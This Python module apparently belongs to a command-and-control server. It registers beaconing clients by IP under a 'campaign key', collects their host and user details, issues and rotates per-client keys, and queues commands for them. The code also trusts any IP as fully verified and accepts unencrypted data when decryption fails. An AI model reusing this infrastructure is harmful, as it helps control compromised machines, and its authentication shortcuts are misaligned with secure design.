import os
import base64
import logging
from datetime import datetime
from utils.client_identity import extract_system_info
import hashlib


logger = logging.getLogger(__name__)

class ClientHelper:
    """Handles client identification, verification, and command management"""
    
    def __init__(self, client_manager, crypto_helper, server):
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.server = server
    
    def identify_client(self, client_ip, headers, system_info_raw=None):
        """
        Identify a client based on IP address only
        
        Returns:
            tuple: (client_id, system_info, newly_identified, first_contact)
        """
        # Use the client IP as the client ID
        client_id = client_ip
        system_info = {}
        newly_identified = False
        first_contact = False
        
        # Check if this is a known client
        if client_id in self.client_manager.get_clients_info():
            logger.info(f"Recognized client by IP address {client_ip}")
        else:
            newly_identified = True
            first_contact = True
            logger.info(f"New client with IP address {client_ip}")
        
        # Process system info if available
        if system_info_raw:
            try:
                # Try to decrypt if encrypted, but handle unencrypted initial requests
                try:
                    # First try treating it as encrypted data with client's key if they're known
                    if client_id in self.client_manager.get_clients_info() and not first_contact:
                        try:
                            system_info_json = self.crypto_helper.decrypt(system_info_raw, client_id)
                        except:
                            # Fall back to campaign key
                            system_info_json = self.crypto_helper.crypto_manager.decrypt(system_info_raw)
                    else:
                        # For new clients, use campaign key
                        system_info_json = self.crypto_helper.crypto_manager.decrypt(system_info_raw)
                    logger.info(f"Successfully decrypted system info from {client_ip}")
                except Exception as e:
                    # If decryption fails, it might be the initial connection without encryption
                    logger.info(f"Decryption failed, trying as unencrypted: {str(e)}")
                    system_info_json = system_info_raw
                    first_contact = True
                
                # Extract key system properties
                try:
                    hostname, username, machine_guid, os_version, mac_address, system_info = extract_system_info(system_info_json)
                    
                    # Add IP to system info
                    system_info['ip'] = client_ip
                    
                except Exception as e:
                    logger.error(f"Error extracting system information: {str(e)}")
                    # Create minimal system info
                    system_info = {'ip': client_ip}
                    hostname = "Unknown"
                    username = "Unknown"
                    
                # Register or update the client
                self.client_manager.add_client(
                    ip=client_ip, 
                    hostname=hostname if 'hostname' in locals() else "Unknown",
                    username=username if 'username' in locals() else "Unknown",
                    machine_guid="Unknown",
                    os_version="Unknown",
                    mac_address="Unknown",
                    system_info=system_info,
                    existing_id=client_id
                )
                
            except Exception as e:
                logger.error(f"Error processing system information: {str(e)}")
                # Ensure client is registered with minimal info
                self.client_manager.add_client(ip=client_ip, existing_id=client_id)
        else:
            # No system info, just register with IP
            self.client_manager.add_client(ip=client_ip, existing_id=client_id)
        
        # First contact check - if client exists but doesn't have a unique key, mark as first contact
        if not first_contact and client_id in self.client_manager.get_clients_info():
            if not self._has_unique_key(client_id):
                first_contact = True
        
        hostname_display = system_info.get('hostname', "Unknown")
        logger.info(f"Client identified as {client_id} ({hostname_display}){' - FIRST CONTACT' if first_contact else ''}")
        return client_id, system_info, newly_identified, first_contact

    def verify_client(self, client_id, system_info):
        """
        Verify client identity using IP address
        
        Returns:
            tuple: (is_verified, confidence, needs_key_rotation, warnings)
        """
        # For IP-based identification, consider clients verified after first contact
        is_verified = True
        confidence = 100.0  # High confidence since we're using IP address
        warnings = []
        
        # Update client verification status
        self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
        
        # Check if client needs key rotation
        has_unique_key = self._has_unique_key(client_id)
        
        # Check for manual key rotation request
        requested_key_rotation = any(
            cmd.get('command_type') == 'key_rotation' 
            for cmd in self.client_manager.get_pending_commands(client_id)
        )
        
        # Always issue a unique key on first connection
        needs_key_rotation = (not has_unique_key or requested_key_rotation)
        
        # Log key rotation status
        if requested_key_rotation:
            logger.info(f"Manual key rotation requested for client {client_id}")
        elif not has_unique_key:
            logger.info(f"First contact with client {client_id} - key issuance needed")
        
        # Register client information for future reference if client_verifier exists
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            self.server.client_verifier.register_client(client_id, system_info)
        
        return is_verified, confidence, needs_key_rotation, warnings
    
    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        if hasattr(self.client_manager, 'has_unique_key'):
            return self.client_manager.has_unique_key(client_id)
        else:
            # Fallback to direct check
            return hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
    
    def prepare_key_issuance(self, client_id):
        """
        Prepare a key issuance for a new client
        
        Returns:
            dict: Key issuance command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key issuance command
        key_issuance_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_issuance",
            "args": base64_key
        }
        
        logger.info(f"Key issuance command created for client {client_id}")
        
        return key_issuance_command
    
    def prepare_key_rotation(self, client_id):
        """
        Prepare a key rotation command for the client
        
        Returns:
            dict: Key rotation command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        logger.info(f"Key rotation command issued for client {client_id}")
        
        return key_rotation_command
    
    def organize_commands(self, client_id, include_key_rotation=False, first_contact=False):
        """
        Organize commands for client including key rotation if needed
        
        Args:
            client_id: Client identifier
            include_key_rotation: Whether to include key rotation command
            first_contact: Whether this is the first contact from client
            
        Returns:
            tuple: (commands, has_key_operation)
        """
        commands = []
        has_key_operation = False
        
        # For first contact, only send a key issuance command
        if first_contact:
            key_issuance_command = self.prepare_key_issuance(client_id)
            commands.append(key_issuance_command)
            has_key_operation = True
            return commands, has_key_operation
        
        # Get pending commands for established clients
        commands = self.client_manager.get_pending_commands(client_id)
        
        # Move any key rotation commands to the front
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_operation = True
                if i > 0:  # Move to front if not already there
                    commands.insert(0, commands.pop(i))
                break
        
        # Add key rotation command if needed and not already present
        if include_key_rotation and not has_key_operation:
            key_rotation_command = self.prepare_key_rotation(client_id)
            commands.insert(0, key_rotation_command)
            has_key_operation = True
        
        return commands, has_key_operation
    
    def clear_commands_after_rotation(self, client_id):
        """Clear key rotation commands but keep other commands"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        non_rotation_commands = [cmd for cmd in pending_commands if cmd.get('command_type') != 'key_rotation']
        
        # Clear all commands then add back non-rotation ones
        self.client_manager.clear_pending_commands(client_id)
        
        for cmd in non_rotation_commands:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )